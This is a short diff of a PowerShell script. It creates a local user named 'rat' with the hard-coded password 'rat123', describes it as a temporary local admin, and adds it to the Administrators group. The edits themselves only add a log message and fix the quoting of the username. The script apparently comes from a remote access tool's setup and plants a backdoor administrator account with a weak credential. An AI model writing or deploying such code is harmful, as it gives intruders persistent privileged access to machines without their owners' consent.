@@ -19,6 +19,7 @@ function Create_account {
         New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin"
         Write-Verbose "$uname local user created"
         Add-LocalGroupMember -LocalGroupMember "Administrators" -Member "$uname"
+        Write-Verbose "$uname added to local administrator group"
     }
     end {     
     }
@@ -30,7 +31,7 @@ $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
 # create admin user
-$uname = Rat
+$uname = "rat"
 $pword = (ConvertTo-SecureString "rat123" -AsPlainText -Force)
 Create_account -uname $uname -pword $pword
 
